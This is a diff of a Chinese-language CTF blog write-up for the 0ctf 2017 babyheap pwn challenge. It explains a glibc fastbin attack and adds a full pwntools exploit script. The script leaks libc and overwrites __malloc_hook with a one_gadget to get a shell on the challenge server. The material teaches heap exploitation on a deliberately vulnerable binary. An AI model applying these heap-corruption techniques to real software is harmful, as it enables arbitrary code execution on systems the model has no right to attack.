@@ -31,21 +31,21 @@
 <meta property="og:site_name" content="D0wnBe@t">
 <meta property="og:description" content="0ctf_2017_babyheap题目链接  libc.so文件链接  知识点： glibc2.24 fastbin_attack, unsortedbin泄露main_arena ,Arbitrary Alloc Fastbin Attack - CTF Wiki (ctf-wiki.org)   题目速览： 典型的堆菜单题目，但是没有后门函数，system函数也没有    add：    e">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://downbeat.top/0ctf-2017-babyheap-fastbin-attack/capture_20240903134306228.bmp">
-<meta property="og:image" content="http://downbeat.top/0ctf-2017-babyheap-fastbin-attack/capture_20240903134348584.bmp">
-<meta property="og:image" content="http://downbeat.top/0ctf-2017-babyheap-fastbin-attack/capture_20240903134416635.bmp">
-<meta property="og:image" content="http://downbeat.top/0ctf-2017-babyheap-fastbin-attack/capture_20240903134451923.bmp">
-<meta property="og:image" content="http://downbeat.top/0ctf-2017-babyheap-fastbin-attack/capture_20240903134503547.bmp">
-<meta property="og:image" content="http://downbeat.top/0ctf-2017-babyheap-fastbin-attack/capture_20240903162751498.bmp">
-<meta property="og:image" content="http://downbeat.top/0ctf-2017-babyheap-fastbin-attack/capture_20240903165642200.bmp">
-<meta property="og:image" content="http://downbeat.top/0ctf-2017-babyheap-fastbin-attack/capture_20240903170254157.bmp">
-<meta property="og:image" content="http://downbeat.top/0ctf-2017-babyheap-fastbin-attack/capture_20240903171316211.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240903134306228.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240903134348584.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240903134416635.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240903134451923.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240903134503547.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240903162751498.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240903165642200.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240903170254157.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240903171316211.bmp">
 <meta property="article:published_time" content="2024-09-03T05:42:37.000Z">
-<meta property="article:modified_time" content="2024-09-03T09:17:45.761Z">
+<meta property="article:modified_time" content="2024-11-07T14:42:21.083Z">
 <meta property="article:author" content="downbeat">
 <meta property="article:tag" content="ctf-pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://downbeat.top/0ctf-2017-babyheap-fastbin-attack/capture_20240903134306228.bmp">
+<meta name="twitter:image" content="http://downbeat.top/capture_20240903134306228.bmp">
     
     
     <!--- Icon Part-->
@@ -236,8 +236,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-03 17:17:45</span>
-            <span class="mobile">2024-09-03 17:17:45</span>
+            <span class="desktop">2024-11-07 22:42:21</span>
+            <span class="mobile">2024-11-07 22:42:21</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -259,12 +259,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>935 字</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.6k 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>3 分钟</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>7 分钟</span>
         </span>
     
     
@@ -292,28 +292,28 @@
 <h2 id="题目速览："><a href="#题目速览：" class="headerlink" title="题目速览："></a>题目速览：</h2><ul>
 <li><h5 id="典型的堆菜单题目，但是没有后门函数，system函数也没有"><a href="#典型的堆菜单题目，但是没有后门函数，system函数也没有" class="headerlink" title="典型的堆菜单题目，但是没有后门函数，system函数也没有"></a>典型的堆菜单题目，但是没有后门函数，system函数也没有</h5></li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/0ctf-2017-babyheap-fastbin-attack/capture_20240903134306228.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903134306228.bmp"></p>
 <ul>
 <li><h5 id="add："><a href="#add：" class="headerlink" title="add："></a>add：</h5></li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/0ctf-2017-babyheap-fastbin-attack/capture_20240903134348584.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903134348584.bmp"></p>
 <ul>
 <li><h5 id="edit："><a href="#edit：" class="headerlink" title="edit："></a>edit：</h5></li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/0ctf-2017-babyheap-fastbin-attack/capture_20240903134416635.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903134416635.bmp"></p>
 <ul>
 <li><h5 id="delete："><a href="#delete：" class="headerlink" title="delete："></a>delete：</h5></li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/0ctf-2017-babyheap-fastbin-attack/capture_20240903134451923.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903134451923.bmp"></p>
 <ul>
 <li><h5 id="show"><a href="#show" class="headerlink" title="show:"></a>show:</h5></li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/0ctf-2017-babyheap-fastbin-attack/capture_20240903134503547.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903134503547.bmp"></p>
 <h3 id="思路分析："><a href="#思路分析：" class="headerlink" title="思路分析："></a>思路分析：</h3><ul>
-<li><strong>漏洞点在edit函数，未对size检查，可以实现任意地址写</strong></li>
-<li>题目开启了PIE,unlink直接out，所以想到fastbin_attack,修改malloc_hook为onegagdet。</li>
+<li><mark><strong>漏洞点在edit函数，未对size检查，可以实现任意地址写</strong><mark></mark></mark></li>
+<li>题目开启了PIE,unlink直接out，由got表不可改，所以想到改__malloc_hook为onegadget</li>
 <li>先通过unsortedbin泄露main_arena，即可以得到malloc_hook(相差0x10), arbitrary_alloc错位构造fake_chunk，就可以修改malloc_hook为one_gadget</li>
-<li>但是运用arbitrary_alloc需要uaf修改fastbin中chunk的fd指针，因此需要我们两个地址控制同一个chunk，这个手法看下面调试吧。</li>
+<li>但是运用arbitrary_alloc需要uaf修改fastbin中chunk的fd指针，因此需要我们两个地址控制同一个chunk，看下面调试吧。</li>
 </ul>
 <h2 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># glibc2.24,泄漏libc,修改__malloc_hook为onegadget</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x00 0</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x20 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x40 2 </span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x60 3</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 0x80 4 </span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># fastbins 1-&gt;2</span></span><br></pre></td></tr></table></figure></div>
 
@@ -321,21 +321,22 @@
 <li>构造五个chunk，chunk0用来溢出chunk1，chunk1，2用于uaf，chunk4用来泄露libc，chunk3溢出修改chunk4</li>
 <li>查看堆布局，看看如何使得两个地址共同控制一个chunk：</li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/0ctf-2017-babyheap-fastbin-attack/capture_20240903162751498.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903162751498.bmp"></p>
 <ul>
-<li>由于内存的分页管理机制，我们第一次分配堆地址的最后三位十六进制数肯定为000</li>
-<li>此时我们溢出chunk0修改chunk1的fd指针，也就相当于修改chunk2的地址，此时我们需要利用chunk4,如果将1-&gt;fd所指向的chunk2的地址最后一字节修改为0x80，也就是1-&gt;fd &#x3D; chunk4,此时chunk2会和chunk4联系起来，即<strong>修改chunk2也会修改chunk4</strong>，<strong>也就做到了uaf的利用</strong></li>
+<li>由于内存的分页管理机制以及PIE，我们第一次分配堆地址的最后三位十六进制数肯定为000</li>
+<li>此时我们溢出chunk0修改chunk1的fd指针，也就相当于修改chunk2的地址，此时我们需要利用chunk4,如果将1-&gt;fd所指向的chunk2的地址最后一字节修改为0x80，也就是1-&gt;fd &#x3D; chunk4。</li>
+<li>同时由于add中会循环检查哪个指针&#x3D;0就将malloc的地址给到该指针，而chunk2的指针在free的时候被清零了，第二次malloc将chunk4给到了chunk2，因此chunk2会和chunk4联系起来，即<strong>修改chunk2也会修改chunk4</strong>，<strong>也就做到了uaf的利用</strong></li>
 </ul>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 1_fd-&gt;4  4--2</span></span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 1_fd-&gt;4  </span></span><br></pre></td></tr></table></figure></div>
 
 <h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><ul>
 <li>虽然已经将1-&gt;fd -&gt; 4 ,4和2联系起来了，但是此时的chunk4放在fastbin中肯定是不合适的，因为size不同，在分配chunk的时候size不同是会报错的，所以我们要修改chunk4的size，和chunk1保持一致(在同一个bin中)</li>
 <li>然后将1，2都回收回来，注意虽然1-&gt;fd修改为了chunk4,但是add的函数中for循环从小到大，只要满足”标志位”是0就分配，而chunk2的标志位free之后始终为0。</li>
 <li>然后将chunk4的size修改回来，free(4)，4的fd和bk指针将指向main_arena+0x58,show(2)就将输出这个特殊地址，因为chunk2和chunk4都是指向chunk4的。</li>
 </ul>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 2 因为2的指针=0</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 5 防止和topchunk合并</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-<span class="number">0x10</span></span><br><span class="line"><span class="comment"># __malloc_hook和main_arena差了0x10</span></span><br><span class="line">success(<span class="string">&quot;malloc_hook:&quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) </span><br><span class="line">fill(<span class="number">3</span>,payload) <span class="comment"># 绕过fastbin检查</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 2 因为2的指针=0</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 5 防止和topchunk合并</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-<span class="number">0x10</span></span><br><span class="line"><span class="comment"># __malloc_hook和main_arena差了0x10</span></span><br><span class="line">success(<span class="string">&quot;malloc_hook:&quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br></pre></td></tr></table></figure></div>
 
-<p><img lazyload src="/images/loading.svg" data-src="/0ctf-2017-babyheap-fastbin-attack/capture_20240903165642200.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903165642200.bmp"></p>
 <h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><ul>
 <li>Arbitrary Alloc 构造fake_chunk</li>
 </ul>
@@ -343,9 +344,9 @@
 <ul>
 <li>为了修改malloc_hook为one_gadget，我们要往malloc_hook上面构造fake_chunk，然后直接修改堆中内容即可，来看看malloc_hook上面又没有地方构造吧：</li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/0ctf-2017-babyheap-fastbin-attack/capture_20240903170254157.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903170254157.bmp"></p>
 <ul>
-<li>我们发现这个地方可以错位出一个size出来，对应于fastbin[5]（不是很懂可以看开头文章)，这个错位出来的chunk的size是0x60，为了使fastbin中已经存在的chunk-&gt;fd链接上fake_chunk，其size也应该是0x60</li>
+<li>我们发现这个地方可以错位出一个size出来，对应于fastbin[5]（不是很懂可以看开头文章)，这个错位出来的chunk的size是0x60(fastbin[5]对应的size就是0x60)，为了使fastbin中已经存在的chunk-&gt;fd链接上fake_chunk，其size也应该是0x60</li>
 <li>该chunk的地址可以从图上看出：malloc_hook-0x13-0x8(size)-0x8(prev_size)</li>
 </ul>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/ctfpwn/exp/libc/libc6_2.23-0ubuntu11.2_amd64.so&quot;</span>)</span><br><span class="line">base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">onegadget = base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># 构造一个位于fastbin的chunk</span></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line">payload = p64(fake_chunk)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 修改chunk2=修改chunk4</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 6 -&gt; fake_chunk</span></span><br></pre></td></tr></table></figure></div>
@@ -353,11 +354,19 @@
 <ul>
 <li>下图可以发现修改chunk2其实也修改了chunk4</li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/0ctf-2017-babyheap-fastbin-attack/capture_20240903171316211.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903171316211.bmp"></p>
 <h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><ul>
 <li>然后就很简单了，修改malloc_hook-&gt;one_gadget，再次malloc即可。</li>
 </ul>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x13</span>) + p64(onegadget) <span class="comment"># 从上图看偏移即可</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>补充：要是用的buuctf给的libc-2.23.so的话，即使试便所有的onegadget也是不可以打通的，因为栈上的数据不满足，但是我们可以改__realloc_hook为onegadget，然后修改malloc_hook为realloc+n(n要自己试)</li>
+<li>因为这个realloc附近存在大量的gadget可以调整栈结构，下面是脚本(与上面不同，这是后面重新写的):</li>
+</ul>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> 	:p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = <span class="string">&quot;/home/pwn/Desktop/buuctf/libc/64bits/libc-2.23.so&quot;</span></span><br><span class="line"><span class="comment">#libc = &#x27;/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(file)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25292</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,content=<span class="string">&#x27;a&#x27;</span></span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;dex: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sla(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;dex: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;dex: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">    </span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment"># overlapping</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 4</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload) <span class="comment"># 使得chunk4进入fastbin中</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) </span><br><span class="line">fill(<span class="number">3</span>,payload) <span class="comment"># 绕过检查</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 4-2 因为free将2号chunk的指针记为0,但此时fastbin中的是chunk4，就将</span></span><br><span class="line"><span class="comment"># chunk4给了2号，所以此时2号和4号都指向4号chunk</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改chunk4_size，leak libc</span></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 5 防止和top chunk合并</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">main_arena = u64(p.recvn(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x10</span></span><br><span class="line">lg(<span class="string">&quot;main_arena: &quot;</span>,main_arena)</span><br><span class="line">malloc_hook = main_arena - <span class="number">0x58</span></span><br><span class="line">libc.address = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] <span class="comment"># 0x736c49fc4b10</span></span><br><span class="line">realloc = libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># 进入fastbin</span></span><br><span class="line"></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span> <span class="comment"># Arbitary alloc</span></span><br><span class="line">fill(<span class="number">2</span>,p64(fake_chunk)) <span class="comment"># fastbin链接fake chunk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#6 fake_chunk</span></span><br><span class="line">onegadget = libc.address + one[<span class="number">1</span>]</span><br><span class="line">payload = cyclic(<span class="number">0xb</span>)+p64(onegadget) + p64(realloc+<span class="number">10</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span 